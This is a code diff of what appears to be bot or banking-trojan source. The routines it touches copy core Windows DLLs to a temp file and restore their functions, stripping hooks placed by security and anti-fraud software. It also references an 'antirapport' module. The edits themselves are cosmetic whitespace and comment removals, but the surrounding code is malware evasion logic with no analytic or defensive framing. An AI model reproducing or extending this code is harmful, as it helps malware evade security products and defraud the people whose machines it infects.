@@ -6,8 +6,6 @@
 #include "Utils.h"
 #include "BotUtils.h"
 #include "DllLoader.h"
-//#include "antirapport.h"
-
 
 
 PIMAGE_NT_HEADERS Unhook_GetNTHeaders(LPVOID Image)
@@ -35,8 +33,8 @@ bool CanRestoreFunc(const char* Name, PDWORD ProcNameHashes)
 	{
 		if (*ProcNameHashes == Hash)
 			return true;
-        ProcNameHashes++;
-    }
+		ProcNameHashes++;
+	}
 	return false;
 }
 //---------------------------------------------------------------------------
@@ -167,15 +165,6 @@ void WINAPI RestoreFuncs(TDllId Dll, DWORD *dwFuncMass)
 	char TempDll[MAX_PATH];
 	if( CopyDllToTemp( DllName, TempDll ) == 0 )
 		return;
-
-
-//	DWORD Size = 0;
-//	LPVOID Buf = File::ReadToBufferA(TempDll.t_str(), Size);
-//
-//	UnhookFunc(Buf, DllName, dwFuncMass);
-//
-//    MemFree(Buf);
-
 
  	HANDLE hFile = pCreateFileA( TempDll, GENERIC_READ, FILE_SHARE_READ, 0, OPEN_EXISTING, 0, 0 );
 	
@@ -528,7 +517,7 @@ void UnhookDlls()
 
 	RestoreFuncs( DLL_NTDLL,     dwNtdll);
 	RestoreFuncs( DLL_KERNEL32,  dwKernel);
-	RestoreFuncs( DLL_WINSOCK,    dwWinsock);
+	RestoreFuncs( DLL_WINSOCK,   dwWinsock);
 	RestoreFuncs( DLL_ADVAPI32,  dwAdvapi);
 	RestoreFuncs( DLL_USER32,    dwUser32);
 	RestoreFuncs( DLL_ODBC32,    dwOdbc);
